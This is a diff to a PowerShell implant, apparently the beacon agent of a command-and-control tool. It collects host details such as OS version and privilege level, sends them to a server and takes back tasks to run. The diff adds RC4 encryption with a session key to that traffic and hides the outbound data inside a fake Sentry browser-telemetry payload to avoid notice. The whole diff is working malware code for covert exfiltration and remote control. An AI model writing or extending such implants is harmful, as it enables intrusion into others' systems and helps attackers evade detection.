@@ -22,6 +22,16 @@ $gmtOffset = [TimeZoneInfo]::Local.GetUtcOffset(
     [DateTime]::Now
 ).TotalMinutes
 
+$encryptKey = "<ENCRYPT_KEY>"
+
+$encryptKeyBytes = for ($i = 0; $i -lt $encryptKey.Length; $i += 2) {
+    [Convert]::ToByte($encryptKey.Substring($i, 2), 16)
+}
+
+$sessionKey = [byte[]]::new(16)
+$rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+$rng.GetBytes($sessionKey)
+
 $flag = 0
 $flag = ($flag -shl 1) -bor ([int]$IsServer)
 $flag = ($flag -shl 1) -bor ([int]$elevated)
@@ -41,11 +51,53 @@ $initialData = @{
     minor_version   = [Environment]::OSVersion.Version.Minor
     process_name    = (Get-Process -Id $PID).ProcessName
     gmt_offset      = $gmtOffset
+    session_key     = $sessionKey
     acp             = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.ANSICodePage
     oemcp           = [System.Globalization.CultureInfo]::CurrentCulture.TextInfo.OEMCodePage
 } | convertto-json
 
 $global:isInitial = $true
+
+function ConvertTo-Rc4ByteStream {
+<#
+    .SYNOPSIS
+        Taken from: https://gist.github.com/HarmJ0y/4edc5bf4cccb0aef5553a860a3e433e3
+#>
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Byte[]]
+        $InputObject,
+
+        [Parameter(Position = 1, Mandatory = $True)]
+        [ValidateNotNullOrEmpty()]
+        [Byte[]]
+        $Key
+    )
+
+    begin {
+        # key-scheduling algorithm
+        [Byte[]] $S = 0..255
+        $J = 0
+        0..255 | ForEach-Object {
+            $J = ($J + $S[$_] + $Key[$_ % $Key.Length]) % 256
+            $S[$_], $S[$J] = $S[$J], $S[$_]
+        }
+        $I = $J = 0
+    }
+
+    process {
+        # pseudo-random generation algorithm (PRGA) combined with XOR logic
+        ForEach($Byte in $InputObject) {
+            $I = ($I + 1) % 256
+            $J = ($J + $S[$I]) % 256
+            $S[$I], $S[$J] = $S[$J], $S[$I]
+            $Byte -bxor $S[($S[$I] + $S[$J]) % 256]
+        }
+    }
+}
+
 
 function SendData($result) {
     # Send data to server using hex encoding and receive answer from server
@@ -53,7 +105,8 @@ function SendData($result) {
     if ($result.Count -ne 0) {
         $encoded = convertto-json -Depth 4 $result
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($encoded)
-        $hexStringData = [System.BitConverter]::ToString($bytes) -replace '-'
+        $encryptedBytes = ConvertTo-Rc4ByteStream -Key $sessionKey -InputObject $bytes
+        $hexStringData = [System.BitConverter]::ToString($encryptedBytes) -replace '-'
     }
     $additionalBeat = ""
     if ($global:isInitial) {
@@ -61,7 +114,10 @@ function SendData($result) {
         $global:isInitial = $false
     }
 
-    $body = '{"event_id":"' + $hexStringBeat + $additionalBeat + '","sent_at":"2025-01-01T00:00:00.000Z","sdk":{"name":"sentry.javascript.browser","version":"7.0.0"}}
+    $finalBeat = $hexStringBeat + $additionalBeat
+    $encFinalBeat = ConvertTo-Rc4ByteStream -Key $encryptKeyBytes -InputObject ([System.Text.Encoding]::UTF8.GetBytes($finalBeat))
+
+    $body = '{"event_id":"' + $encFinalBeat + '","sent_at":"2025-01-01T00:00:00.000Z","sdk":{"name":"sentry.javascript.browser","version":"7.0.0"}}
 {"type":"transaction"}
 {"contexts":{"trace":{"trace_id":"trace123456789abc","span_id":"span123456789abc","op":"pageload"}},"spans":[{"span_id":"span987654321def","op":"http.client","description":"' + $hexStringData + '","start_timestamp":1704067200.000,"timestamp":1704067200.100,"trace_id":"trace123456789abc"}],"start_timestamp":1704067200.000,"timestamp":1704067201.000,"transaction":"/home","type":"transaction","platform":"javascript"}
 '
@@ -73,10 +129,16 @@ function SendData($result) {
         return New-Object System.Collections.ArrayList
     }
 
+    $encodedHexBytes = for ($i = 0; $i -lt $encodedTaskData.Length; $i += 2) {
+        [Convert]::ToByte($encodedTaskData.Substring($i, 2), 16)
+    }
+
+    $decodedTaskData = (ConvertTo-Rc4ByteStream -Key $sessionKey -InputObject $encodedHexBytes | ForEach-Object { "{0:X2}" -f $_}) -join ''
+
     $offset = 0
 
-    $hexBytes = for ($i = 0; $i -lt $encodedTaskData.Length; $i += 2) {
-        [Convert]::ToByte($encodedTaskData.Substring($i, 2), 16)
+    $hexBytes = for ($i = 0; $i -lt $decodedTaskData.Length; $i += 2) {
+        [Convert]::ToByte($decodedTaskData.Substring($i, 2), 16)
     }
 
     $res1 = [BitConverter]::ToUint32($hexBytes, $offset)
